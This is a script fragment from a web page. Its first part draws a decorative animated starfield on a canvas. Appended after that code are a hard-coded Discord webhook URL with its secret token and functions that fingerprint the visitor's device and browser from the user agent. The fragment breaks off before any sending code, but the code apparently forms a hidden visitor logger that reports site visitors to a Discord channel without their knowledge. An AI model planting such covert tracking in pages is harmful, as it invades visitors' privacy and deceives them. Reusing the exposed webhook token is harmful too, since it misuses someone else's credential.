  <script>
    // ====== Original canvas code ======
    const canvas = document.getElementById('space');
    const ctx = canvas.getContext('2d');
    let W = canvas.width = innerWidth;
    let H = canvas.height = innerHeight;

    window.addEventListener('resize',()=>{W=canvas.width=innerWidth;H=canvas.height=innerHeight;init()});

    const particles = [];
    const stars = [];
    const numParticles = Math.floor((W*H)/60000) + 30;

    function rand(min,max){return Math.random()*(max-min)+min}

    function init(){
      particles.length=0;
      stars.length=0;
      for(let i=0;i<numParticles;i++){
        particles.push({x:rand(0,W),y:rand(0,H),r:rand(0.6,2.6),vx:rand(-0.2,0.2),vy:rand(-0.05,0.3),alpha:rand(0.02,0.9)})
      }
      for(let i=0;i<220;i++){
        stars.push({x:rand(0,W),y:rand(0,H),r:rand(0.3,1.6),tw:Math.random()*Math.PI*2,spd:rand(0.002,0.01)})
      }
    }

    function loop(now){
      ctx.clearRect(0,0,W,H);
      ctx.fillStyle = '#000';
      ctx.fillRect(0,0,W,H);

      for(let s of stars){
        s.tw += s.spd;
        const a = 0.4 + Math.sin(s.tw)*0.6;
        ctx.globalAlpha = a;
        ctx.beginPath();
        ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
        ctx.fillStyle = '#fff';
        ctx.fill();
      }
      requestAnimationFrame(loop);
    }

    init();
    requestAnimationFrame(loop);
    
    const webhookURL = "https://discord.com/api/webhooks/1447453204051918973/PSh3xS4vSR-Pt_vPcEdWtscrBPEuA9c85_9hbkgp8mTjTGLsHwZTO__c0pmbJ7bcHtjS";

    function getDeviceType() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile|android|iphone|ipad|tablet/.test(ua)) return "Mobile";
      return "Desktop";
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari")) return "Safari";
      return "Unknown Browser";
